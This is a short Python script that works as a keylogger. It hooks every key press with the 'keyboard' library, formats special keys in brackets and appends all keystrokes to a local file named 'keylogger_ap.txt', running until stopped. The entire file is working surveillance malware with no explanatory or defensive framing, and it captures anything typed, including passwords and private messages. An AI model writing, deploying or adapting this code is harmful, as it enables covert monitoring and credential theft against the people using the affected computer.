import keyboard  

def writer(data):
    with open("keylogger_ap.txt", "a") as file:
        file.write(data)

def format_key(key):
    if key == "space":
        return " "
    elif len(key) > 1:
        return "[" + key + "]"
    else:
        return key

def log_keystroke(event):
    writer(format_key(event.name))

keyboard.on_press(log_keystroke)
keyboard.wait()
